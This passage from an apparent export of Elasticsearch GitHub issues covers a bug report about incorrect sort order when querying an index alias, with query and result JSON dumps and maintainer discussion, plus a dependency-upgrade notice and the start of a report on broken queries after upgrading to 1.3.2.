                  "motion_type": "stationary",
                  "start_date": 1408441377.377091,
                  "number_of_steps": 1620,
                  "duration": 8290.440024495125,
                  "order_date": 1408449667.817116,
                  "id": "1408441377.377091-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958624986e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408452938.713164-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 10.458,
                  "end_date": 1408453879.153991,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408452938.713164,
                  "number_of_steps": 14,
                  "duration": 940.4408271312714,
                  "order_date": 1408453879.153991,
                  "id": "1408452938.713164-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958682104e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408050000-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5336.568,
                  "end_date": 1408136400,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408050000,
                  "number_of_steps": 7144,
                  "duration": 86400,
                  "order_date": 1408136400,
                  "id": "1408050000-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408050000
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408222800-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 4076.379,
                  "end_date": 1408309200,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408222800,
                  "number_of_steps": 5457,
                  "duration": 86400,
                  "order_date": 1408309200,
                  "id": "1408222800-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408222800
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408463037.221965-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 177.786,
                  "end_date": 1408470644.548557,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408463037.221965,
                  "number_of_steps": 238,
                  "duration": 7607.326591610909,
                  "order_date": 1408470644.548557,
                  "id": "1408463037.221965-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408463037.221965
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408456930.040181-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5.229,
                  "end_date": 1408463006.851273,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408456930.040181,
                  "number_of_steps": 7,
                  "duration": 6076.811092078686,
                  "order_date": 1408463006.851273,
                  "id": "1408456930.040181-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.95870183e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407790800-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 2.241,
                  "end_date": 1407823148.624126,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407790800,
                  "number_of_steps": 3,
                  "duration": 32348.62412595749,
                  "order_date": 1407823148.624126,
                  "id": "1407790800-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407790800
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407877200-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 4134.645,
                  "end_date": 1407963600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407877200,
                  "number_of_steps": 5535,
                  "duration": 86400,
                  "order_date": 1407963600,
                  "id": "1407877200-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407877200
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407963600-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 6652.035,
                  "end_date": 1408050000,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407963600,
                  "number_of_steps": 8905,
                  "duration": 86400,
                  "order_date": 1408050000,
                  "id": "1407963600-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407963600
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408136400-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 10236.141,
                  "end_date": 1408222800,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408136400,
                  "number_of_steps": 13703,
                  "duration": 86400,
                  "order_date": 1408222800,
                  "id": "1408136400-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408136400
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408309200-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 3161.304,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408309200,
                  "number_of_steps": 4232,
                  "duration": 86400,
                  "order_date": 1408395600,
                  "id": "1408309200-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408309200
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408395600-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 2337.363,
                  "end_date": 1408474407.530582,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408395600,
                  "number_of_steps": 3129,
                  "duration": 78807.53058201075,
                  "order_date": 1408474407.530582,
                  "id": "1408395600-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408395600
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408449687.813152-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5.229,
                  "end_date": 1408450160.890107,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408449687.813152,
                  "number_of_steps": 7,
                  "duration": 473.0769553780556,
                  "order_date": 1408450160.890107,
                  "id": "1408449687.813152-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.95866604e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407823148.624126-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 1706.148,
                  "end_date": 1407877200,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407823148.624126,
                  "number_of_steps": 2284,
                  "duration": 54051.37587404251,
                  "order_date": 1407877200,
                  "id": "1407823148.624126-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407823148.624126
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408387971.543879-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 871.749,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408387971.543879,
                  "number_of_steps": 1167,
                  "duration": 7628.456121563911,
                  "order_date": 1408395600,
                  "id": "1408387971.543879-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958361125e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408450305.447627-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 15.687,
                  "end_date": 1408452812.031366,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408450305.447627,
                  "number_of_steps": 21,
                  "duration": 2506.583738684654,
                  "order_date": 1408452812.031366,
                  "id": "1408450305.447627-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958669096e-315
            ]
         }
      ]
   },
   "aggregations": {
      "max": {
         "value": 4743694330017250000
      }
   }
}
```

as opposed to correct sorting of data when querying single index

```
GET myindex_7/mytype/_search
{
  "query": {
    "constant_score": {
      "filter": {
        "and": {
"filters": [
              {"term": {
                "user_id": 582313
              }}

          ]
        }
      }
    }
  },
  "sort": [
    {
      "data.start_date": {
        "order": "asc",
        "ignore_unmapped": "true"
      }
    }
  ]
,
"aggs": {
  "max": {
    "max": {
      "field": "data.order_date"
    }
  }
}, 
  "size": 110
}
```

```
{
   "took": 4,
   "timed_out": false,
   "_shards": {
      "total": 8,
      "successful": 8,
      "failed": 0
   },
   "hits": {
      "total": 16,
      "max_score": null,
      "hits": [
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408387971.543879-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 871.749,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408387971.543879,
                  "number_of_steps": 1167,
                  "duration": 7628.456121563911,
                  "order_date": 1408395600,
                  "id": "1408387971.543879-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958361125e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408441377.377091-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 1210.14,
                  "end_date": 1408449667.817116,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408441377.377091,
                  "number_of_steps": 1620,
                  "duration": 8290.440024495125,
                  "order_date": 1408449667.817116,
                  "id": "1408441377.377091-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958624986e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408449687.813152-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5.229,
                  "end_date": 1408450160.890107,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408449687.813152,
                  "number_of_steps": 7,
                  "duration": 473.0769553780556,
                  "order_date": 1408450160.890107,
                  "id": "1408449687.813152-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.95866604e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408450305.447627-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 15.687,
                  "end_date": 1408452812.031366,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408450305.447627,
                  "number_of_steps": 21,
                  "duration": 2506.583738684654,
                  "order_date": 1408452812.031366,
                  "id": "1408450305.447627-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958669096e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408452938.713164-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 10.458,
                  "end_date": 1408453879.153991,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408452938.713164,
                  "number_of_steps": 14,
                  "duration": 940.4408271312714,
                  "order_date": 1408453879.153991,
                  "id": "1408452938.713164-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958682104e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408456930.040181-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5.229,
                  "end_date": 1408463006.851273,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408456930.040181,
                  "number_of_steps": 7,
                  "duration": 6076.811092078686,
                  "order_date": 1408463006.851273,
                  "id": "1408456930.040181-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.95870183e-315
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407790800-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 2.241,
                  "end_date": 1407823148.624126,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407790800,
                  "number_of_steps": 3,
                  "duration": 32348.62412595749,
                  "order_date": 1407823148.624126,
                  "id": "1407790800-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407790800
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407823148.624126-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 1706.148,
                  "end_date": 1407877200,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407823148.624126,
                  "number_of_steps": 2284,
                  "duration": 54051.37587404251,
                  "order_date": 1407877200,
                  "id": "1407823148.624126-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407823148.624126
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407877200-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 4134.645,
                  "end_date": 1407963600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407877200,
                  "number_of_steps": 5535,
                  "duration": 86400,
                  "order_date": 1407963600,
                  "id": "1407877200-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407877200
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1407963600-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 6652.035,
                  "end_date": 1408050000,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407963600,
                  "number_of_steps": 8905,
                  "duration": 86400,
                  "order_date": 1408050000,
                  "id": "1407963600-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407963600
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408050000-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5336.568,
                  "end_date": 1408136400,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408050000,
                  "number_of_steps": 7144,
                  "duration": 86400,
                  "order_date": 1408136400,
                  "id": "1408050000-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408050000
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408136400-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 10236.141,
                  "end_date": 1408222800,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408136400,
                  "number_of_steps": 13703,
                  "duration": 86400,
                  "order_date": 1408222800,
                  "id": "1408136400-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408136400
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408222800-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 4076.379,
                  "end_date": 1408309200,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408222800,
                  "number_of_steps": 5457,
                  "duration": 86400,
                  "order_date": 1408309200,
                  "id": "1408222800-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408222800
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408309200-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 3161.304,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408309200,
                  "number_of_steps": 4232,
                  "duration": 86400,
                  "order_date": 1408395600,
                  "id": "1408309200-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408309200
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408395600-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 2337.363,
                  "end_date": 1408474407.530582,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408395600,
                  "number_of_steps": 3129,
                  "duration": 78807.53058201075,
                  "order_date": 1408474407.530582,
                  "id": "1408395600-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408395600
            ]
         },
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408463037.221965-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 177.786,
                  "end_date": 1408470644.548557,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408463037.221965,
                  "number_of_steps": 238,
                  "duration": 7607.326591610909,
                  "order_date": 1408470644.548557,
                  "id": "1408463037.221965-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408463037.221965
            ]
         }
      ]
   },
   "aggregations": {
      "max": {
         "value": 4743694330017250000
      }
   }
}
```

nevermind the broken aggregations and "sort" field values, this started to happen only after upgrade to 1.3.2
</description><key id="40642600">7343</key><summary>sorting does not work when querying an alias</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">OlegYch</reporter><labels><label>bug</label></labels><created>2014-08-19T22:09:10Z</created><updated>2015-11-21T17:16:17Z</updated><resolved>2015-11-21T17:16:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="OlegYch" created="2014-08-19T22:15:09Z" id="52707217">the ticket about 1.3.2 is #7341 
before an upgrade to 1.3.2 i was also getting random ClassCastExceptions inside org.apache.lucene.search.TopDocs#merge when sorting on that field
not sure if all of this is an indication of one issue
CheckIndex does not report any errors
</comment><comment author="OlegYch" created="2014-08-19T23:42:48Z" id="52715789">same failure is observed when querying multiple indexes instead of alias, i.e GET myindex_7,users_idx3/mytype/_search
</comment><comment author="clintongormley" created="2014-08-20T07:46:50Z" id="52744071">OK, looking at this issue and #7341, it looks like you have fields with the same name in different types in the same index.  When you try to load these field values into fielddata, it chooses one of the field mappings (whichever one it finds first) and loads in that format.

This is not new - it has been like this since the beginning.  Fields with the same name should be mapped in the same way.

We're planning on enforcing this in the future.  See #4081 
</comment><comment author="OlegYch" created="2014-08-20T11:38:05Z" id="52763915">why does it work when searching through single index?
</comment><comment author="clintongormley" created="2014-08-20T13:19:35Z" id="52776359">It just depends on which field it happens to see first.
</comment><comment author="OlegYch" created="2014-08-20T13:51:06Z" id="52780385">thanks, got it
</comment><comment author="OlegYch" created="2014-08-21T15:04:59Z" id="52932999">i made sure all types in all indexes from that alias use the same type for that field but the sorting is still wrong when querying through alias, how can that be ?
</comment><comment author="OlegYch" created="2014-08-21T15:05:55Z" id="52933164">even cleared the cache for all indexes
</comment><comment author="OlegYch" created="2014-08-21T15:35:15Z" id="52937495">```
curl -XGET myserver:9200/myalias/_mapping?pretty 2&gt;/bla  |grep -A3 start_date
              "start_date" : {
                "type" : "double"
              },
              "terrain" : {
--
              "start_date" : {
                "type" : "double"
              }
            }

GET myalias/mytype/_search
{
  "query": {
    "constant_score": {
      "filter": {
        "and": {
"filters": [
              {"term": {
                "user_id": 582313
              }}

          ]
        }
      }
    }
  },
  "sort": [
    {
      "data.start_date": {
        "order": "asc",
        "ignore_unmapped": "true"
      }
    }
  ]
,
"aggs": {
  "max": {
    "max": {
      "field": "data.start_date"
    }
  }
},
  "size": 1100
}

{
   "took": 19,
   "timed_out": false,
   "_shards": {
      "total": 20,
      "successful": 20,
      "failed": 0
   },
   "hits": {
      "total": 5,
      "max_score": null,
      "hits": [
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_F5114468-DA0E-4E9F-A195-5122AAEBC475",
            "_score": null,
            "_source": {
               "_id": "582313_F5114468-DA0E-4E9F-A195-5122AAEBC475",
               "data": {
                  "id": "F5114468-DA0E-4E9F-A195-5122AAEBC475",
                  "duration": 897.5677289962769,
                  "end_date": 1408444861.339127,
                  "category": "sleep",
                  "deep_duration": 0,
                  "quality": 0.05621061269658856,
                  "light_duration": 50.45283198356628,
                  "phases": [
                     {
                        "duration": 850.4915599822998,
                        "type": "awake",
                        "date": 1408443960.083729
                     },
                     {
                        "duration": 50.45283198356628,
                        "type": "light",
                        "date": 1408444810.575289
                     },
                     {
                        "duration": 0.3110060691833496,
                        "type": "awake",
                        "date": 1408444861.028121
                     }
                  ],
                  "awake_duration": 850.8025660514832,
                  "order_date": 1408444861.339127,
                  "start_date": 1408443963.771398,
                  "editable": true
               },
               "user_id": 582313
            },
            "sort": [
               1408443963.771398
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_61647662-2738-4C6B-A0BD-1536F1EAA313",
            "_score": null,
            "_source": {
               "_id": "582313_61647662-2738-4C6B-A0BD-1536F1EAA313",
               "data": {
                  "id": "61647662-2738-4C6B-A0BD-1536F1EAA313",
                  "duration": 780,
                  "end_date": 1408531044,
                  "distance": 200,
                  "category": "running",
                  "calories": 292.11,
                  "order_date": 1408531044,
                  "start_date": 1408530264,
                  "editable": true
               },
               "user_id": 582313
            },
            "sort": [
               1408530264
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_2FEA2D8A-4B2A-4C71-8A8D-AE0921B3AAAD",
            "_score": null,
            "_source": {
               "_id": "582313_2FEA2D8A-4B2A-4C71-8A8D-AE0921B3AAAD",
               "data": {
                  "id": "2FEA2D8A-4B2A-4C71-8A8D-AE0921B3AAAD",
                  "duration": 7505.24406504631,
                  "end_date": 1408541467.491296,
                  "category": "sleep",
                  "deep_duration": 0,
                  "quality": 0,
                  "light_duration": 0,
                  "phases": [
                     {
                        "duration": 7505.244183063507,
                        "type": "awake",
                        "date": 1408533962.247113
                     }
                  ],
                  "awake_duration": 7505.244183063507,
                  "order_date": 1408541467.491296,
                  "start_date": 1408533962.247231,
                  "editable": false
               },
               "user_id": 582313
            },
            "sort": [
               1408533962.247231
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_71F810C0-2290-46F5-84FE-36AE390B06FA",
            "_score": null,
            "_source": {
               "_id": "582313_71F810C0-2290-46F5-84FE-36AE390B06FA",
               "data": {
                  "id": "71F810C0-2290-46F5-84FE-36AE390B06FA",
                  "duration": 7620,
                  "end_date": 1408557945.435768,
                  "distance": 100,
                  "category": "cycling",
                  "calories": 1189.0375,
                  "order_date": 1408557945.435768,
                  "start_date": 1408550325.435768,
                  "editable": true
               },
               "user_id": 582313
            },
            "sort": [
               1408550325.435768
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_5C2797AA-7BFD-40AD-99FF-35278E719293",
            "_score": null,
            "_source": {
               "_id": "582313_5C2797AA-7BFD-40AD-99FF-35278E719293",
               "data": {
                  "id": "5C2797AA-7BFD-40AD-99FF-35278E719293",
                  "duration": 3600,
                  "end_date": 1408548615,
                  "is_deleted": true,
                  "distance": 100,
                  "category": "cycling",
                  "calories": 561.7500000000001,
                  "order_date": 1408548615,
                  "start_date": 1408545015,
                  "editable": true
               },
               "user_id": 582313
            },
            "sort": [
               1408545015
            ]
         }
      ]
   },
   "aggregations": {
      "max": {
         "value": 1408550325.435768
      }
   }
}
```
</comment><comment author="clintongormley" created="2014-08-22T14:18:28Z" id="53065633">@OlegYch Apologies - I was wrong here, didn't read carefully enough, and was confused by the ClassCastException, which is usually related to the problem I described before.

This does indeed look like a bug. Do you have the stack trace emitted when merging? Also, could you provide:

```
GET /_settings
GET /_mapping
GET /_aliases
```

thanks
</comment><comment author="OlegYch" created="2014-08-25T15:49:44Z" id="53282563">@clintongormley there doesn't seem to be any exceptions caused by query
i've sent you the results of those requests on email, please let me know if there is anything else i can do to diagnoze it
</comment><comment author="jpountz" created="2014-09-04T11:26:16Z" id="54456558">I'm not sure the bug is related to aliases. The sort values look wrong in both cases (even when querying a single index), see:

``` json
        {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408387971.543879-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 871.749,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408387971.543879,
                  "number_of_steps": 1167,
                  "duration": 7628.456121563911,
                  "order_date": 1408395600,
                  "id": "1408387971.543879-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958361125e-315
            ]
         }
```

The value in `sort` should be equal to the value in `start_date` but they are completely different. But it happens that if you interpret the bits of `1408387971` (the integer part of start date) as double bits, you get `6.958361125E-315`, which is the sort value.

So in spite of the fact that the field is mapped as a double in the mappings, it looks like it has been indexed as a long. I will try to dig more...
</comment><comment author="jpountz" created="2014-09-04T18:25:19Z" id="54522399">The only explanation I can find is that the same field has been dynamically mapped as a long on some shards and as a double on other shards (before mappings propagation  replicated the mappings to all nodes).
</comment><comment author="OlegYch" created="2014-09-05T13:02:46Z" id="54621726">i explicitly put the mapping for that type before putting any data in it, so i doubt that is the case
i believe the sort value was borked because there were different types in different mappings for that field
currently the value in sort is correct (as i made sure there are no conflicts, and use full field path including type name), but the sorting is still wrong
</comment><comment author="clintongormley" created="2015-11-21T17:16:17Z" id="158662944">This should have been resolved by the changes in #8870 in 2.0.  Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>HttpComponents Client 4.3.5 GA Released</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7342</link><project id="" key="" /><description>http://mail-archives.apache.org/mod_mbox/www-announce/201408.mbox/%3C1407690982.9788.2.camel%40ubuntu%3E

http://mail-archives.apache.org/mod_mbox/www-announce/201408.mbox/CVE-2014-3577
</description><key id="40631675">7342</key><summary>HttpComponents Client 4.3.5 GA Released</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">based2</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T20:12:44Z</created><updated>2014-08-22T07:47:13Z</updated><resolved>2014-08-22T07:45:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>broken queries and aggregation on existing data after upgrade from 1.3.1 to 1.3.2</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7341</link><project id="" key="" /><description>i just updated a cluster of 4 nodes and queries are no longer returning my data and aggregation results are screwed
e.g. a query using range filter returns no data while a match_all returns data which should have been matched, and max aggregation returns a value not present in the docs
can't report more details atm, but it appears that the release is seriously screwed
</description><key id="40630459">7341</key><summary>broken queries and aggregation on existing data after upgrade from 1.3.1 to 1.3.2</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">OlegYch</reporter><labels><label>feedback_needed</label></labels><created>2014-08-19T20:00:11Z</created><updated>2014-08-20T07:47:18Z</updated><resolved>2014-08-20T07:47:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="OlegYch" created="2014-08-19T21:29:38Z" id="52701850">here is an example:

```
GET myindex/mytype/_search
{
  "query": {
    "constant_score": {
      "filter": {
        "and": {
"filters": [
              {"term": {
                "user_id": 582313
              }}
          ]
        }
      }
    }
  },
  "sort": [
    {
      "data.start_date": {
        "order": "asc",
        "ignore_unmapped": "true"
      }
    }
  ]
,
"aggs": {
  "max": {
    "max": {
      "field": "data.order_date"
    }
  }
}, 
  "size": 110
}

```

```
{
   "took": 4,
   "timed_out": false,
   "_shards": {
      "total": 8,
      "successful": 8,
      "failed": 0
   },
   "hits": {
      "total": 16,
      "max_score": null,
      "hits": [
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408387971.543879-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 871.749,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408387971.543879,
                  "number_of_steps": 1167,
                  "duration": 7628.456121563911,
                  "order_date": 1408395600,
                  "id": "1408387971.543879-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958361125e-315
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408441377.377091-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 1210.14,
                  "end_date": 1408449667.817116,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408441377.377091,
                  "number_of_steps": 1620,
                  "duration": 8290.440024495125,
                  "order_date": 1408449667.817116,
                  "id": "1408441377.377091-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958624986e-315
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408449687.813152-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5.229,
                  "end_date": 1408450160.890107,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408449687.813152,
                  "number_of_steps": 7,
                  "duration": 473.0769553780556,
                  "order_date": 1408450160.890107,
                  "id": "1408449687.813152-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.95866604e-315
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408450305.447627-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 15.687,
                  "end_date": 1408452812.031366,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408450305.447627,
                  "number_of_steps": 21,
                  "duration": 2506.583738684654,
                  "order_date": 1408452812.031366,
                  "id": "1408450305.447627-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958669096e-315
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408452938.713164-0",
            "_score": null,
            "_source": {
